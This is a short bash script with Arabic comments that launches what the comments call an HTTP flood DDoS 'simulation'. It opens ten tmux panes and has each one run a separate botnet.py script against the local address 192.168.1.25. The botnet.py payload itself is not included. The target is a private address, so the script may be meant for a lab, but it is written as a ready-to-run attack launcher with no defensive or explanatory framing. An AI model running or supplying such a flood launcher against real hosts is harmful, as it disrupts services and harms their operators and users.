#!/bin/bash

# اسم الجلسة المخصصة للـ HTTP Flood
SESSION_NAME="http_ddos_simulation"

# 1. إنشاء جلسة tmux جديدة في الخلفية
tmux new-session -d -s $SESSION_NAME

# 2. إنشاء 9 تقسيمات إضافية ليصبح المجموع 10 أجزاء
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
done

# 3. إرسال أمر تشغيل السكريبت إلى كل جزء (Pane)
# تأكد من وجود ملف botnet.py في نفس المسار
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "python3 botnet.py http://192.168.1.25/" C-m
done

# 4. الدخول إلى الجلسة لرؤية الهجوم الموزع
tmux attach-session -t $SESSION_NAME
